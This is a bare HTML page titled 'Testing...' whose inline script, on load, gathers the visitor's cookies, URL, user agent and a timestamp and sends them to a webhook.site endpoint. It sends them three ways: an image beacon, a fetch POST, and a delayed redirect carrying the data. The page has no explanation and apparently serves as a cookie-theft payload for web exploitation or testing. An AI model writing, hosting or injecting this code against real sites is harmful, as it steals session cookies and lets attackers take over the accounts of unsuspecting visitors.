<!DOCTYPE html>
<html>
<body>
<h1>Testing...</h1>
<script>
const webhook = 'https://webhook.site/ec478dd5-ba0d-4a39-805c-67faa2025381';

const info = {
    cookies: document.cookie,
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
};

function sendData() {
    const img = new Image();
    img.src = webhook + '?method=img&data=' + encodeURIComponent(JSON.stringify(info));
    
    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({method: 'fetch', ...info})
    }).catch(e => console.log('Fetch failed:', e));
    
    setTimeout(() => {
        window.location = webhook + '?method=redirect&data=' + encodeURIComponent(JSON.stringify(info));
    }, 2000);
}

sendData();
</script>
</body>
</html>
